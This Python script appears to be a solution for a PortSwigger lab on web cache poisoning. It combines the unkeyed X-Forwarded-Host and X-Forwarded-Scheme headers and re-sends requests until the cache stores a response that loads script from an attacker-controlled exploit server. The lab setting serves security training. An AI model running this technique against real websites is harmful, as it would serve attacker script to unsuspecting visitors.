"""
Lab 3: Web cache poisoning with multiple headers
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers
Difficulty: Practitioner

📝 Needs TWO unkeyed headers working together — one alone doesn't reach
the dangerous sink. Commonly X-Forwarded-Host (controls the domain) +
X-Forwarded-Scheme (controls http/https, enabling an exploitable
protocol-relative or scheme-dependent script injection).
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"


def run():
    s = get_session()

    note("Step 1: confirm BOTH headers are individually unkeyed and")
    note("together produce the reflected sink (e.g. a script tag whose")
    note("src is built from scheme + host).")
    r = s.get(f"{TARGET}/?cb=12345",
              headers={"X-Forwarded-Host": "example.com", "X-Forwarded-Scheme": "http"})
    log(f"X-Cache: {cache_status(r)!r}")
    log(f"Reflected combo: {'example.com' in r.text}")

    note("Step 2: poison with cache-buster + both malicious header values.")
    poison_until_hit(s, f"{TARGET}/?cb=12345",
                      headers={"X-Forwarded-Host": EXPLOIT_HOST,
                               "X-Forwarded-Scheme": "http"})

    note("Step 3: re-poison the real URL without the cache-buster.")
    r = poison_until_hit(s, f"{TARGET}/",
                          headers={"X-Forwarded-Host": EXPLOIT_HOST,
                                   "X-Forwarded-Scheme": "http"})
    if r:
        log(f"Poisoned, exploit host present: {EXPLOIT_HOST in r.text}")


if __name__ == "__main__":
    run()
